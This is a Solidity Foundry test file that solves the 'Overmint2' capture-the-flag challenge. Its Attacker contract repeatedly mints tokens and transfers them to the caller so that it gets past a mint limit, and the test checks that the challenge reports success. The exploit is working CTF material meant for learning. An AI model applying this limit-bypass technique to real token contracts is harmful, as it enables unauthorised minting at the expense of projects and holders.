// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import {Test, console2} from "forge-std/Test.sol";
import {Overmint2} from "../../src/ctf/Overmint2.sol";

contract Overmint2Test is Test {
    Overmint2 overmint;
    Attacker attacker;
    address owner;
    address alice;

    function setUp() public {
        owner = address(this);
        alice = makeAddr("alice");

        overmint = new Overmint2();
        attacker = new Attacker();
    }

    function testAttack() public {
        vm.startPrank(alice);
        attacker.pwn(address(overmint));
        assertTrue(overmint.success());
        vm.stopPrank();
    }
}

contract Attacker {
    function pwn(address overmint) public {
        IOvermint(overmint).mint();
        IOvermint(overmint).mint();
        IOvermint(overmint).mint();
        for (uint256 i = 1; i < 4; i++) {
            IOvermint(overmint).transferFrom(address(this), msg.sender, i);
        }
        IOvermint(overmint).mint();
        IOvermint(overmint).mint();
        for (uint256 i = 4; i < 6; i++) {
            IOvermint(overmint).transferFrom(address(this), msg.sender, i);
        }
    }
}

interface IOvermint {
    function mint() external;
    function balanceOf(address owner) external view returns (uint256 balance);
    function transferFrom(address from, address to, uint256 tokenId) external;
}